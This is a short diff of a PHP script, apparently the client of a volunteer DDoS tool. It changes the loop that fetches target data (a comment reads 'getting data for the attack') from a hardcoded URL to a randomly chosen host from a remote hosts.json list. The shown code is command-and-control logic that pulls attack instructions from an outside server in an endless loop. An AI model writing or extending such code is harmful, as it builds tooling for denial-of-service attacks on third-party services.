@@ -2,16 +2,16 @@
 
     $total = 0;
     $count = 0;
-    $host = "https://hutin-puy.nadom.app/";
 
     $sessionMaxRequests = 10000;
 
     while (true) {
+        $hosts = json_decode(file_get_contents('https://hutin-puy.nadom.app/hosts.json'), true);
         try {
             // отримую дані для атаки
             echo "GET DATA \n";
             $count = 0;
-            $data = @file_get_contents($host);
+            $data = @file_get_contents($hosts[array_rand($hosts)]);
 
             if(!$data){
                 sleep(2);
